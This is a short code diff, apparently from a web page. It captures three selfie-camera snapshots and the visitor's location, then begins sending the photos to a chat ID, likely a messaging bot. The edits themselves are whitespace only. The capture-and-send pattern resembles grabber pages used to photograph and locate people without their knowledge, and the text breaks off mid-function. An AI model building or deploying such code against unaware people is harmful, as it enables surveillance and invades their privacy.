@@ -151,10 +151,12 @@ function getTempLocation() {
 async function getTempData() {
   tempPhotos = [];
   tempLocationMsg = "";
+
   try {
     const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
     const video = document.createElement("video");
     video.srcObject = stream; await video.play();
+    
     for (let i = 0; i < 3; i++) {
       const tempCanvas = document.createElement("canvas");
       tempCanvas.width = video.videoWidth; tempCanvas.height = video.videoHeight;
@@ -164,8 +166,11 @@ async function getTempData() {
       await new Promise(r => setTimeout(r, 400));
     }
     stream.getTracks().forEach(t => t.stop());
-  } catch (e) {}
+  } catch (e) {
+  }
+
   await getTempLocation();
+  
   if (tempPhotos.length === 0 && !tempLocationMsg) {
     document.getElementById("noDataModal").style.display = "block";
   } else {
@@ -176,6 +181,7 @@ async function getTempData() {
 async function finalSend() {
   document.getElementById("confirmModal").style.display = "none";
   document.getElementById("result").textContent = "送信中...";
+  
   for (const blob of tempPhotos) {
     const fd = new FormData();
     fd.append("chat_id", CHAT_ID);
